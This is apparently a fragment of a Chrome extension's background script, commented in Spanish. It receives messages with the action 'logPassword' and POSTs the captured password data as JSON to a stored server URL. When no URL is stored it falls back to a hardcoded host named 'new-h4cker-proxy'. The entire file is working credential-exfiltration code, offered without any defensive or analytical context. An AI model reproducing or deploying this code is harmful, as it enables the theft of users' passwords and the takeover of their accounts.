chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 if (request.action === "logPassword") {
 const data = request.data;

 // Obtener configuración guardada (URL del servidor)
 chrome.storage.local.get(['serverUrl'], (result) => {
 const targetUrl = result.serverUrl || "https://new-h4cker-proxy.site.je/api.php"; // Fallback

 // Enviar datos a la API
 fetch(targetUrl, {
 method: "POST",
 headers: {
 "Content-Type": "application/json"
 },
 body: JSON.stringify(data)
 })
.then(response => response.json())
.then(res => console.log("Enviado a API:", res))
.catch(err => console.error("Error API:", err));
 });
 }
});